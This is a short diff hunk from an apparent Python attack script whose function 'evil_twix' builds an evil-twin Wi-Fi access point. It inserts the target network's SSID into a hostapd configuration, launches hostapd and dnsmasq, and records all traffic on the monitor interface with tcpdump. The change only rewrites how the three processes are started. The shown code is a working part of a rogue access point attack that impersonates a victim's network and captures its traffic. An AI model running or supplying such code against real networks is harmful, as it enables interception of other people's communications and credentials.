@@ -90,9 +90,9 @@ def evil_twix(interface, target):
     os.system("sed -i 's/iface_to_use/%s/' hostapd.conf" % (interface+"mon"))
     os.system("sed -i 's/ssid_to_use/%s/' hostapd.conf" % target[0])
 
-    os.system("hostapd hostapd.conf \
-        & dnsmasq –d –C dnsmasq.conf \
-        & tcpdump -s 0 -i %s -w test.pcap" % (interface+"mon"))
+    os.system("exec hostapd hostapd.conf")
+    os.system("exec dnsmasq –d –C dnsmasq.conf")
+    os.system("tcpdump -s 0 -i %s -w test.pcap" % (interface+"mon"))
 
 if __name__ == "__main__":
     
